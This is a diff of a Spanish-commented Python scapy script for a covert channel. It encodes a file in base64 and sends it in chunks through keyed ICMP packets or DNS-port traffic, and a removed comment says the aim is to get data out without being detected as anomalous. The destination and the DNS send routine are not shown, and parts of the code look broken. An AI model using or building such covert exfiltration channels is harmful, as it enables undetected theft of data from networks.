@@ -1,9 +1,6 @@
 #!/usr/bin/python
-# pcc (portantier covert channel) - Envio de datos
-
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-
 from scapy.all import *
 import binascii
 import base64
@@ -24,13 +21,11 @@ l4_TCP = TCP()
 l4_TCP.dport=53
 l7 = DNS()
 
-# defin)imos el resto de las variables
-key = "12345678" # con esta clave vamos a diferenciar
-#nuestros paquetes de los otros paquetes ICMP que van a llegar al host"
+key = "12345678" # con esta clave vamos a diferenciar nuestros paquetes de los otros paquetes ICMP que van a llegar al host"
 msgsize = 12  #como vamos a dividir el mensaje en partes,aqui definimos el tamano de cada parte
 #payload = "" # declaramos la variable 'payload' que vamos a utilizar mas adelante
 
-data = "Estos son los datos que vamos a enviar a traves del canal encubierto."
+data = "Datos a enviar por el canal encubierto"
 
 # las variables 'first', 'last' y 'count' las vamos a utilizar para el proceso de cada parte del mensaje
 first = 0
@@ -42,7 +37,6 @@ def convert_file_to_hex(path_to_file='/home/javier/Pictures/skydiving-katrina.jp
         content=f.read()
 
     out=binascii.hexlify(content)
-
     return out
 
 def convert_file_to_b64(path_to_file='/home/javier/Pictures/skydiving-katrina.jpg'):
@@ -58,14 +52,11 @@ def convert_b64_to_file(file_in_b64,path_to_save='/home/javier/Pictures/skydivin
 
 
 def send_file_icmp():
-    # entramos en un bucle en el cual vamos a enviar un paquete para cada trozo de datos
     print "fist {}".format(first) 
     for a in range(0, count):
         print "Enviando la parte %s de %s ... (%s)" %(a + 1, count, data[first:last])
         payload = key + data[first:last]
-        # ensamblamos el paquete (las capas que no definimos son definidas automaticamente por scapy
         pkt = l3/l4/payload
-        # enviamos el paquete
         a = sr(pkt, verbose = 1, retry = 0, timeout = 1)
         first += msgsize
         last += msgsize
@@ -104,17 +95,10 @@ def send_file_dns(file_to_send,chunk_size):
 
 
 def main():
-    #fileinb64=convert_file_to_b64()
-    #send_file(fileinb64)
-    #convert_b64_to_file(fileinb64,)
-    #print fileinb64
-    #char_test='Esto es una prueba de test de payload. Si todo va bien la longitud del mensaje y sus datos se describen luego'
     wd=os.getcwd()
     print wd
     b64file=convert_file_to_b64(sys.argv[1])
 
-    
-    #char_test='Esta es una prueba de que puedo sacar los datos utilizando el protocolo DNS sin que me detecten como trafico anomalo'
     print "Longitud del mensaje: {}".format(len(b64file))
     #send_file_dns('Olvido todo ese frio reunido de una sola vez Debes en cuando cada tanto los juegos prohibidos nos sacan ese frio Escurro entre tus dedos tus canciones tus mitos hoooooooooy',246)
     send_file_dns(b64file,246)
